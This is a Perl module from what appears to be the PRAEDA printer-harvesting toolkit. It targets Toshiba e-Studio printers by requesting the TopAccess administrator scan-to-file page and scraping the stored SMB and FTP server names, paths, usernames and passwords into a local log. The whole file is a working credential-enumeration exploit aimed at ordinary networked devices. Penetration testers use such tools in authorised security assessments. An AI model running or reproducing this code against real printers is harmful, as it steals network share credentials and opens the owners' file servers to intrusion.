# Toshiba Estudio credential enumeration 
# 
######################################################
#               PRAEDA Module #MP0007                #
#          Copyright (C) 2010 Foofus.net	     #
#                                                    #
#               Deral (percX) Heiland                #
#                                                    #
######################################################
package MP0007;
sub MP0007
{
 
# Set global variables
my $TARGET = $_[1];
my $PORTS = $_[2];
my $web = $_[3];
my $OUTPUT = $_[4];
my $LOGFILE = $_[5];

#----- Setup and retrieve cookie and place in cookie jar
my $browser = LWP::UserAgent->new(timeout => 15);
my $jar = HTTP::Cookies->new();
$browser->cookie_jar($jar);
my $req= new HTTP::Request GET =>"http://$TARGET:$PORTS/";
my $res = $browser->request($req);
$jar->extract_cookies($res);

#----- Enumerate SMB, FTP File Save Credentials 
open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open  Output file $OUTPUT \n");
print "\n**********Attempting to enumerate SMB, FTP File Save Credentials $TARGET : Job MP0007**********\n";
print OUTFILE  "\n**********Attempting to enumerate SMB, FTP File Save Credentials $TARGET : Job MP0007**********\n";

#----- retrieve file save settings page from Toshiba printer
my $url1="http://$TARGET:$PORTS/TopAccess//Administrator/Setup/ScanToFile/List.htm";
my $request = new HTTP::Request('GET', $url1);
my $response = $browser->request($request);
my $content = $response->content();

#----- parse SMB, FTP  settings from page information on input tags
my $html = HTML::TagParser->new($content);
my @list = $html->getElementsByTagName( "input" );
    foreach my $elem ( @list ) 
   {
        my $text1 = $elem->getAttribute("name");
        my $text2 = $elem->getAttribute("value");
            
                  if (($text1 =~ /^STR/) && ($text1 =~ /SERVNAME$/)
                     || ($text1 =~ /^STR/) && ($text1 =~ /NETPATH$/) 
                     || ($text1 =~ /^STR/) && ($text1 =~ /USERNAME$/) 
                     || ($text1 =~ /^STR/) && ($text1 =~ /PASS$/))
                     {
                       $text2 =~ s/&#92\;/\\/g;
                       # print "$text1 value = $text2\n";
		       print OUTFILE "$text1 value = $text2\n";
                     }
                  else 
                    {
                    }
    }
    




#----- operation completed close out output files
close(OUTFILE);
}
		
1;
